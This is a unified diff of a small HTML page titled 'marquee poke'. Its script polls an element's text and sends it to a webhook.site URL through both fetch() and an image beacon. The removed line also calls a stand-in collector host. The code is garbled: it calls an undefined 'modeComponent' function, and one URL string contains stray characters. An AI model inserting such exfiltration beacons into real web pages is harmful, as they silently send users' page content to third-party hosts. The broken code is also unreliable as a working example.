@@ -1,1 +1,9 @@
-<!doctype html><title>marquee poke</title><div id="box"><marquee>placeholder</marquee></div><script>(function(){function exfil(s){fetch('T 	https://webhook.site/7d3cecb8-0345-4be5-9502-6e45160a306c?d='+modeComponent(s)).catch(() => {});new Image().src='https://your-collector.example/ingest.gif?d='+encodeURI(s);}function poll(){const t = document.getElementById('box').innerText.trim();if(t){console.log('Got:', t);exfil(t);} else {setTimeout(poll, 120);}}poll()})();</script>
+<!doctype html>
+<title>marquee poke</title>
+<div id="box">
+    <marquee>placeholder</marquee>
+</div>
+<script>
+(function () { function exfil(s) { fetch('https://webhook.site/7d3cecb8-0345-4be5-9502-6e45160a306c?d=' + modeComponent(s)).catch(() => { }); new Image().src = 'https://webhook.site/7d3cecb8-0345-4be5-9502-6e45160a306c?d=' + encodeURI(s); } function poll() { const t = document.getElementById('box').innerText.trim(); if (t) { console.log('Got:', t); exfil(t); } else { setTimeout(poll, 120); } } poll() })();
+
+</script>
